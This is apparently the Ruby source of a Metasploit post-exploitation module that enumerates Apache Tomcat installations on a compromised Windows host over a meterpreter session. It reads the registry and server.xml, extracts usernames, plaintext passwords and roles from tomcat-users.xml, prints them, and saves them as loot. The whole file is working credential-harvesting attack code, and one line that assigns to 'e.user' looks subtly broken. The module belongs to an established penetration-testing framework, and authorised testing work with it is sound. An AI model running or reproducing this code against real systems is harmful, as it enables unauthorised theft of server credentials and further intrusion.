##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rexml/document'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Apache Tomcat Enumeration',
        'Description' => %q{
          This module will collect information from a Windows-based Apache Tomcat. You will get
          information such as: The installation path, Tomcat version, port, web applications,
          users, passwords, roles, etc.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Barry Shteiman <barry[at]sectorix.com>', # Module author
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )
  end

  def run
    installs = []
    results = []
    users = []
    print_status("Enumerating Tomcat Servers on #{sysinfo['Computer']}")
    if check_tomcat
      installs += identify_registry

      if installs.empty?
        print_status('Done, Tomcat not found')
        return
      end

      installs.each do |inst|
        results += enumerate_tomcat(inst[0], inst[1])
        users += enumerate_tomcat_creds(inst[0])
      end
    end

    if results.empty?
      print_status('Done, Tomcat not found')
      return
    end

    print_status('Done, Tomcat Found.')

    tbl_services = Rex::Text::Table.new(
      'Header' => 'Tomcat Applications ',
      'Indent' => 1,
      'Columns' =>
        [
          'Host',
          'Tomcat Version',
          'Port',
          'Web Application'
        ]
    )

    results.each do |r|
      report_service(host: session.sock.peerhost, port: r[2], name: 'http', info: "#{r[0]} Tomcat #{r[1]}, Application:#{r[3]}")
      tbl_services << r
    end

    tbl_users = Rex::Text::Table.new(
      'Header' => 'Tomcat Server Users ',
      'Indent' => 1,
      'Columns' =>
        [
          'Host',
          'User',
          'Password',
          'Roles'
        ]
    )

    users.each do |u|
      tbl_users << [ session.sock.peerhost, u[0], u[1], u[2] ]
    end

    print_line
    print_line(tbl_services.to_s)
    print_line(tbl_users.to_s)
    p = store_loot('host.webservers.tomcat', 'text/plain', session, tbl_services.to_s + "\n" + tbl_users.to_s, 'tomcat.txt', 'Tomcat Server Enum')
    print_good("Results stored in: #{p}")
  end

  ### initial identification methods ###

  # method for checking if webserver is installed on server - tomcat
  def check_tomcat
    key = 'HKLM\\SOFTWARE\\Apache Software Foundation'
    if registry_enumkeys(key).include?('Tomcat')
      print_status("\tTomcat found.")
      return true
    end
    return false
  rescue StandardError
    return false
  end

  ### deep server enumeration methods ###

  # enumerate tomcat
  def enumerate_tomcat(val_installpath, val_version)
    results = []
    found = false
    print_good("\t\t+ Version: #{val_version}")
    print_good("\t\t+ Path: #{val_installpath}")

    if !exist?(val_installpath + '\\conf\\server.xml')
      print_error("\t\t! tomcat configuration not found")
      return results
    end

    appname = find_application_name(val_installpath)

    ports = []
    xml_data = read_file(val_installpath + '\\conf\\server.xml')
    doc = REXML::Document.new(xml_data)
    doc.elements.each('Server/Service/Connector') do |e|
      ports << e.attributes['port']
    end
    ports.uniq.each do |p|
      print_good("\t\t+ Port: #{p}")
      found = true
      results << [session.sock.peerhost, val_version.to_s, p, appname]
    end
    if found
      print_good("\t\t+ Application: [#{appname}]")
    else
      print_error("\t\t! port not found")
    end
    return results
  rescue StandardError
    print_error("\t\t! could not identify information")
    return results || []
  end

  # enumerate tomcat users from its user base
  def enumerate_tomcat_creds(val_installpath)
    users = []
    userpath = val_installpath + '\\conf\\tomcat-users.xml'
    if exist?(userpath)
      xml_data = read_file(userpath)
      doc = REXML::Document.new(xml_data)

      if !doc.elements.empty?
        doc.elements.each('tomcat-users/user') do |e|
          e_user = e.attributes['name']
          if !e_user.empty?
            e_user = e.attributes['name']
          else
            e.user = e_user = e.attributes['username']
          end
          users << [ e_user, e.attributes['password'], e.attributes['roles'] ]
          print_good("\t\t+ User:[#{e_user}] Pass:[#{e.attributes['password']}] Roles:[#{e.attributes['roles']}]")
        end
      else
        print_error("\t\t! No Users Found")
        return users
      end
    end

    return users
  rescue StandardError
    print_error("\t\t! could not identify users")
    return users || []
  end

  ### helper functions ###

  # this method identifies the correct registry path to tomcat details, and returns [path,version]
  def identify_registry
    values = []
    basekey = 'HKLM\\SOFTWARE\\Apache Software Foundation\\Tomcat'
    instances = registry_enumkeys(basekey)
    return values if instances.blank?

    instances.each do |i|
      major_version_key = "#{basekey}\\#{i}"
      services = registry_enumkeys(major_version_key)

      if services.empty?
        val_installpath = registry_getvaldata(major_version_key, 'InstallPath')
        val_version = registry_getvaldata(major_version_key, 'Version')
        values << [val_installpath, val_version]
      else
        services.each do |s|
          service_key = "#{major_version_key}\\#{s}"
          val_installpath = registry_getvaldata(service_key, 'InstallPath')
          val_version = registry_getvaldata(service_key, 'Version')
          values << [val_installpath, val_version]
        end
      end
    end

    return values
  rescue StandardError
    print_error("\t\t! failed to locate install path")
    return nil || []
  end

  # this function extracts the application name from the main page of the web application
  def find_application_name(val_installpath)
    index_file = ['index.html', 'index.htm', 'index.php', 'index.jsp', 'index.asp']
    path = val_installpath + '\\webapps'
    if !directory?(path + '\\ROOT')
      print_error("\t\t! expected directory wasnt found")
      return 'Unknown'
    end

    index_file.each do |i|
      if !exist?("#{path}\\ROOT\\#{i}")
        next
      end

      data = read_file(path + "\\ROOT\\#{i}")
      if data =~ %r{(?i)<title>([^<]+)</title>}
        return ::Regexp.last_match(1)
      elsif data =~ %r{(?i)onload="?document\.location=['"]?([/\w\d]+)['"]?"?}
        # look for redirect as name
        return ::Regexp.last_match(1).gsub('/', '')
      end
    end
    return 'Unknown'
  rescue StandardError
    print_error("\t\t! could not identify application name")
    return 'Unknown'
  end
end
